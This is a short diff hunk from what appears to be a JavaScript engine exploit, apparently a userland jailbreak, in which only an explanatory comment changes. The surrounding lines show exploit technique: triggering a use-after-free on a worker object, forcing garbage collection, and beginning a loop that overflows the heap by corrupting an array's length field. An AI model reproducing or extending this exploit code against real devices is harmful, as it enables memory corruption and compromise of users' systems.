@@ -120,7 +120,7 @@ function int64(low,hi) {
   return this;
 }
 function callback(ev) {
-	// alert(worker.GetURL.a); UAF here. Presumably, worker.GetURL.a is freed but still has a pointer to its original value (777), even though its a dangling pointer. worker.GetURL.a is analogous to uafTarget in qwertyoruiopz's 4.0x userland exploit.
+	// alert(worker.GetURL.a); UAF here. Presumably, worker.GetURL.a is freed but still has a pointer to its original value (777 from the POC), even though its a dangling pointer. worker.GetURL.a is analogous to uafTarget in qwertyoruiopz's 4.0x userland exploit.
 	gc();
 	// heap overflow by overwriting the "length" field of the butterfly
 	for (var i = 0; i < 0x1000; i++) {
